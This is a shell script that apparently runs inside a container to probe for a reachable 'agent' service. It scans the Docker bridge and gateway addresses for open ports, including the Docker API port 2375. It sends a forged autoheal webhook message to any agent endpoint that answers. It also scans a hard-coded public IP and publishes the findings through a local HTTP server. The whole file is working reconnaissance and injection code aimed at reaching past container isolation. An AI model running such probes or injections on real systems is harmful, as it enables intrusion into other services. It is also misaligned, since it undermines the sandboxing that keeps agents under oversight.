#!/bin/sh
echo "=== ipvlan L3 → agent access probe v7 ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== INTERFACES ===" >> /app/index.html
ip -4 addr show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ROUTES ===" >> /app/index.html
ip route show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== ARP TABLE ===" >> /app/index.html
ip neigh show >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== SCAN docker bridge 172.18.0.x:8000 (agent) ===" >> /app/index.html
for i in $(seq 1 30); do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000/health" 2>/dev/null)
  if [ "$RESULT" != "000" ]; then
    echo "172.18.0.$i:8000/health → HTTP $RESULT !!!" >> /app/index.html
    curl -sv -m 3 "http://172.18.0.$i:8000/health" >> /app/index.html 2>&1
    echo "" >> /app/index.html
    # Try webhook injection
    echo "--- WEBHOOK TEST on 172.18.0.$i ---" >> /app/index.html
    curl -sv -m 3 -X POST "http://172.18.0.$i:8000/webhooks/autoheal" \
      -H "Content-Type: application/json" \
      -d '{"content":"Container test-ipvlan-probe_00000000-0000-0000-0000-000000000000 (unhealthy) restarted"}' >> /app/index.html 2>&1
    echo "" >> /app/index.html
    # Try root endpoint
    echo "--- ROOT on 172.18.0.$i ---" >> /app/index.html
    curl -sv -m 3 "http://172.18.0.$i:8000/" >> /app/index.html 2>&1
    echo "" >> /app/index.html
  fi
done
echo "" >> /app/index.html

echo "=== SCAN docker bridge 172.18.0.x ports ===" >> /app/index.html
for i in $(seq 1 30); do
  for port in 80 443 8080 5672 9200 9100 2375 8000; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== TRY agent hostname resolve ===" >> /app/index.html
getent hosts agent >> /app/index.html 2>&1
nslookup agent >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== TRY host IP agent:8000 ===" >> /app/index.html
HOST_IP=$(ip route | grep default | awk '{print $3}')
echo "Default GW: $HOST_IP" >> /app/index.html
for port in 8000 8080 22 80 443; do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://${HOST_IP}:${port}/" 2>/dev/null)
  echo "${HOST_IP}:${port} → HTTP $RESULT" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== TRY docker0 gateway 172.17.0.1:8000 ===" >> /app/index.html
curl -sv -m 3 "http://172.17.0.1:8000/health" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "=== TRY 10.x ranges ===" >> /app/index.html
for gw in "10.0.0.1" "10.1.0.1" "10.244.0.1"; do
  RESULT=$(curl -s -m 1 -o /dev/null -w "%{http_code}" "http://${gw}:8000/health" 2>/dev/null)
  [ "$RESULT" != "000" ] && echo "${gw}:8000/health → HTTP $RESULT" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== PUBLIC IP host scan ===" >> /app/index.html
PUB_IP="45.89.190.124"
for port in 8000 8080 22 80 443 5672 9200 2375; do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://${PUB_IP}:${port}/" 2>/dev/null)
  [ "$RESULT" != "000" ] && echo "${PUB_IP}:${port} → HTTP $RESULT" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== done $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" >> /app/index.html
cd /app && python3 -m http.server 8080
